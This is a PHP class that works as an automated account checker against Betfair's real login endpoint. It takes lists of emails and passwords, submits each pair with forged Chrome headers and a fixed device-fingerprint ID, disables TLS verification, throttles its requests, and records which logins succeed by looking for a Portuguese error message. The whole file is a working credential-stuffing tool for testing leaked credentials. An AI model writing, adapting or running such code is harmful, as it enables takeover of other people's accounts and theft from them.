<?php

namespace App\Services\Betfier\LoginChecker;

use CurlHandle;

class LoginChecker
{
    private static array $success = [];
    private static array $fail = [];

    public static function handle(array $data): array
    {
        foreach ($data as $datum) {
            $email = $datum['email'];

            $curl = self::configureCurl($email, $datum['password']);

            $response = curl_exec($curl);

            if (self::isFail($response)) {
                self::$fail[] = $email;

                continue;
            }

            self::$success[] = $email;

            sleep(1);
        }

        return ['success' => self::$success, 'fail' => self::$fail];
    }

    public static function configureCurl(string $email, string $password): CurlHandle|bool
    {
        $curl = curl_init();

        curl_setopt($curl, CURLOPT_URL, 'https://identitysso.betfair.com/api/login');
        curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, 1);
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($curl, CURLOPT_HTTPHEADER, [
            'Host: identitysso.betfair.com',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type: application/x-www-form-urlencoded',
            'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
            'origin: https://identitysso.betfair.com',
            'referer: https://identitysso.betfair.com/view/login?redirectMethod=GET&product=sportsbook&url=https://www.betfair.com/sport',
            'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
        ]);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_POST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl, CURLOPT_POSTFIELDS, 'username=' . $email . '&remember=on&password=' . $password . '&redirectMethod=GET&product=sportsbook&prod=&url=https%3A%2F%2Fwww.betfair.com%2Fsport&submitForm=true&tmxId=21baf7c4-d475-4bae-95c2-d0dd723ee83e');

        return $curl;
    }

    public static function isFail(bool|string $response): int|false
    {
        return strpos($response, 'Parece que ocorreu um erro. Não se preocupe, você pode tentar novamente ou pode');
    }
}